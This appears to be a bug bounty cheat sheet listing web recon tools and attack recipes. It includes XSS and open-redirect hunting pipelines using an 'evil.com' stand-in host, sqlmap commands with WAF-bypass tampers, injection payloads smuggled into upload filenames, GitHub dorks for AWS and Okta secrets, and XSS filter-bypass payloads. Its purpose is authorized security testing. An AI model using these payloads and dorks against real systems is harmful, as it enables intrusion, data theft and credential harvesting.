- https://github.com/maurosoria/dirsearch
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/DanMcInerney/xsscrapy

- Burp Suite
- SecLists
- whatcms
- Striker
- OWASP ZAP
- Dirb
- Scrapy
- Dirbuster
- Gobuster
- Wfuzz
- CyberChef
- Sublist3r	
- Massdns
- Dnsenum
- Knockpy
- nmap 
- Masscan
- Sn1per
- XSStrike
- Sqlmap
- Wpscan
- Joomscan
- CMSmap
- Builtwith
- Wappalyzer
- wafw00f


- passive hunter
- a-mass
- subfinder
- httpx
- aquatone
- dalfox
- nuclei
- open redirect x
- massdns
- paramspider

### XSS Payloads (xsshunter)
- xalgord.xss.ht

## file upload vulnerability test
- https://github.com/epinna/weevely3

## XSS recon methodology
▶ cat domains.txt | waybackurls > urls

```
cat urls.txt        --> read the file
| kxss              --> filter special characters
| sed 's/=.*/=/'    --> remove everything after = ,add = 
| sed 's/URL: //'   --> remove URL: and white space
| dalfox pipe       --> dalfox tool for xss payload
-b xalgord.xss.ht   --> BXSS payload adder.
```

## Open Redirect Mass Hunt
- tool = ragno, qsreplace
```
python3 ragno.py -d intensedebate.com -s -q -o ragno_urls.txt
```
```
cat ragno_urls.txt | grep -a -i \=http | wc -w
```
```
cat ragno_urls.txt | grep -a -i \=http > potential_openredirect_vun.txt
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" | wc -w
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" > unique_potential_openredirect.txt
```
```
cat unique_potential_openredirect.txt | while read target_urls do; do curl -s -L $target_urls -I | grep "evil.com" && echo "[Vulnerable] $target_urls \n"; done
```



- Example: One Liner for Hunting Mass Open Redirect

```
python3 ragno.py -d test.vulnweb.com -s -q -o ragno_urls.txt | cat ragno_urls.txt | grep -a -i \=http | qsreplace "http://evil.com" | while read target_url do; do curl -s -L $target_url -I | grep "evil.com" && echo "[+] [Vulnerable] $target_url \n"; done

```


## Amass Command

```
amass enum -brute -o output.txt -d example.com -v
```

## Detect Low Hanging Bugs and Sensitive Information like API Keys, Secrets etc. including JS Files and HTML Pages


First run Amass Scan and save its output and then run Sublist3r with bruteforce mode and also save its output in different file. 
Now open a Website such as https://www.textfixer.com/tools/remove-duplicate-lines.php to remove duplicate subdomains.

Tool: https://github.com/BitTheByte/Eagle

Basic Usage:
```
python3 main.py -f domains.txt
```

Advanced Usage:
```
python3 main.py -f domains.txt -w 10 --db output.db.json
```

To check API keys if they vulnerable or not, use a tool such as gmapsapiscanner, it is usefull to save the time by automating the process and also if it gets any Vulnerable API, it will generate its POC itself.

Tool: https://github.com/ozguralp/gmapsapiscanner

Usage:
```
python3 maps_api_scanner_python3.py
```

## SQL Injection Methodologies
*try login with admin admin and send login request  to burp

*do an active scan

if show SQL injection with parameter 

#POC 

copy request in txt 

and on sqlmap 
```
sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
```
and you have a valid SQL INJ 😎😎


## Reflected XSS On private program

1- 
```
amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
```
2-
```
cat domian.txt | httpx -o domainhttpx.txt
```
3-
```
cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
```
DONE 😎


## Find SQL injections (command combo)
```
subfinder -d target.com | tee -a domains
cat domains | httpx | tee -a urls.alive
cat urls.alive | waybackurls | tee -a urls.check
gf sqli urls.check >> urls.sqli
sqlmap -m urls.sqli --dbs --batch
```
Here’s what’s going on in detail:

1. First we will find all subdomains under our target domain.
2. Next we will identify all alive web servers running on those subdomains.
3. Waybackurls will fetch all URLs that the Wayback Machine knows about the identified alive subdomains.
4. Now we will filter out URLs that match patterns with potential SQL injection.
5. The final step is to run sqlmap on all identified potentially vulnerable URLs and let it do its magic.

Protip: If you need to bypass WAF (Web Application Firewall) in the process, add the following options to sqlmap:
```
--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
```

## Get scope of Bugcrowd programs in CLI
There is a new tool in town called bcscope which can get you the scope of all bug bounty programs available on Bugcrowd platform, including the private ones.

All you have to do is to provide your Bugcrowd token like this:
```
bcscope -t <YOUR-TOKEN-HERE> -c 2 -p
```
![alt text](https://www.infosecmatter.com/wp-content/uploads/2020/10/list-scope-for-bugcrowd-bug-bounty-programs.jpg)

Quite convenient and pretty useful!

Get the tool here:

- https://github.com/sw33tLie/bcscope

## Chaining file uploads with other vulns
When testing file upload functionalities in a web application, try setting the filename to the following values:


- ../../../tmp/lol.png —> for path traversal
- sleep(10)-- -.jpg —> for SQL injection
- <svg onload=alert(document.domain)>.jpg/png —> for XSS
- ; sleep 10; —> for command injections

With these payloads, we may trigger additional vulnerabilities.

## GitHub dorks for AWS, Jira, Okta .. secrets
Here are some useful GitHub dorks shared by @hunter0x7 for identifying sensitive information related to Amazon AWS cloud:
```
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
```
Here’s another list of GitHub dorks shared by @GodfatherOrwa for identifying various other credentials and secrets:
```
"target.com" password or secret
"target.atlassian" password
"target.okta" password
"corp.target" password
"jira.target" password
"target.onelogin" password
target.service-now password
some time only "target"
```
Protip: While you are doing GitHub dorking, try also [GitDorker](https://github.com/obheda12/GitDorker) (made by [@obheda12](https://twitter.com/obheda12)) which automates the whole process and which contains 400+ dorks in total, for easy bug bounty wins.

Detailed information about GitDorker can be found [here](https://medium.com/@obheda12/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5).

Also check related tip [BBT5-8](https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/#8_github_dorks_for_finding_secrets).


## Simple reflected XSS scenario

Here’s an interesting bug bounty write-up leading to a reflected XSS (Cross-Site Scripting by visiting a link).

The author was able to successfully identify and exploit XSS despite the fact that the application was filtering some characters and keywords (possibly protected by WAF).

Here’s what [@_justYnot](https://twitter.com/_justYnot) did in detail:

1. Run subfinder -d target.com | httprobe -c 100 > target.txt
2. Run cat target.txt | waybackurls | gf xss | kxss
3. Got a URL which had all the special characters unfiltered and the parameter was callback=
4. Tried some basic XSS payloads but they weren’t working, the site was filtering some keywords in the payload (like script and alert)
5. Then he referred to the [@PortSwigger](https://twitter.com/PortSwigger) XSS cheat sheet ([link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))
6. After trying some payloads, one payload with event as onbegin worked and XSS executed successfully!
7. Made a good report, sent it to the company last month and got rewarded $$

This is a perfect example why we should never give up when things get difficult. When you’ve got a lead, you have to keep pushing to get the reward!
Here’s list of tools [@_justYnot](https://twitter.com/_justYnot) used:

- https://github.com/projectdiscovery/subfinder
- https://github.com/tomnomnom/httprobe
- https://github.com/tomnomnom/waybackurls
- https://github.com/tomnomnom/gf
- https://github.com/1ndianl33t/Gf-Patterns (xss pattern)
- https://github.com/tomnomnom/hacks/tree/master/kxss


## XSS firewall bypass techniques
Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application Firewall) while exploiting XSS (Cross-Site Scripting) in a web application:
1. Check if the firewall is blocking only lowercase:
<sCRipT>alert(1)</sCRiPt>
2. Try to break firewall regex with new line (\r\n), aka. CRLF injection:
<script>%0d%0aalert(1)</script>
3. Try double encoding:
%2522
4. Testing for recursive filters, if firewall removes the text in bold, we will have clear payload:
<scr<script>ipt>alert(1);</scr</script>ipt>
5. Injecting anchor tag without whitespaces:
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
6. Try to bypass whitespaces using a bullet:
<svg•onload=alert(1)>
7. Try to change request method (POST instead of GET):
GET /?q=xss	POST /
q=xss	
